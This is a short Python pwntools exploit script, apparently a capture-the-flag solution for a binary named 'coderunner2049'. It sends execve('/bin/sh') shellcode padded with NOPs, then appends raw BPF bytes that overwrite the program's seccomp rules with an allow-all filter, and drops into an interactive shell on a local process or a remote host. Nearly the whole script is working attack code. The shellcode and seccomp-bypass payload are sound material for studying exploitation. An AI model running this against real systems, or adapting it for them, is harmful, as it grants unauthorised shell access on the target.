#!/usr/bin/python3

from pwn import *
from sys import argv

if len(argv) != 3:
    hostname = "localhost"
    port = 1337
else:
    hostname = argv[1]
    port = int(argv[2])

elf = ELF('./coderunner2049')

REMOTE = False
DEBUG = not REMOTE

context.arch = 'amd64'
context.terminal = ['gnome-terminal', '--title=GDB-Pwn', '-e']

if REMOTE:
    r = remote(hostname, port)
else:
    r = elf.process()

#Â execve("/bin/sh", NULL, NULL) shellcode
# https://github.com/voydstack/shellcoding/blob/master/x64/shell/shell.asm
code = asm("""
    xor rsi, rsi
	push rsi
	pop rdx

	push rsi
	mov rdi, 0x68732f2f6e69622f
	push rdi
	mov rdi, rsp

	push 0x3b
	pop rax
	syscall
""").ljust(0x80, b'\x90')

# Corrupting the SECCOMP rules with ours

"""
A == exit ? next : next
return ALLOW
A == 0xc3 ? next : next
"""

code += b"\x15\x00\x00\x00<\x00\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x15\x00\x00\x00\xC3\x00\x00\x00"

r.sendafter(': ', code)

log.success('Enjoy your shell :)')

r.interactive()
